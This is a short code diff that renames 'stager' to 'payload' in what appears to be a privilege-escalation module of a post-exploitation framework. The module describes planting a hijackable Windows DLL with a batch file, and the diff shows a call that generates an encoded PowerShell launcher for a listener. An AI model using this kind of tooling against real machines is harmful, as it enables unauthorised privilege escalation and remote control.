@@ -10,7 +10,7 @@ class Module:
             'Author': ['leechristensen (@tifkin_)', '@harmj0y'],
 
             'Description': ("Writes out a hijackable .dll to the specified path "
-                            "along with a stager.bat that's called by the .dll. "
+                            "along with a payload.bat that's called by the .dll. "
                             "wlbsctrl.dll works well for Windows 7. "
                             "The machine will need to be restarted for the privesc to work."),
 
@@ -109,7 +109,7 @@ class Module:
         proxyCreds = self.options['ProxyCreds']['Value']
 
         # generate the launcher code
-        launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
+        launcher = self.mainMenu.payloads.generate_launcher(listenerName, language='powershell', encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
 
         if launcher == "":
             print helpers.color("[!] Error in launcher command generation.")
